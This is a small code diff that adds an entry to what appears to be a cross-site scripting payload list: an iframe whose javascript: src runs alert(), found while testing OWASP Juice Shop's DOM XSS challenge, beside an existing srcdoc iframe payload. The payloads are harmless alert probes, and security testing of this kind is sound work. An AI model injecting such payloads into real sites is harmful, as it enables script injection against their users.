@@ -46,6 +46,11 @@ PAYLOADS = {
         # Self-triggering iframe - no event needed, srcdoc executes
         # inline HTML (including its own <script>) immediately.
         "<iframe srcdoc=\"<script>alert('XSS-test')</script>\">",
+
+        # javascript: pseudo-protocol inside an iframe's src attribute -
+        # found this during testing against OWASP Juice Shop's "DOM XSS"
+        # challenge, which specifically checks for this exact pattern.
+        "<iframe src=\"javascript:alert(`xss`)\">",
     ],
 
     # ------------------------------------------------------------------
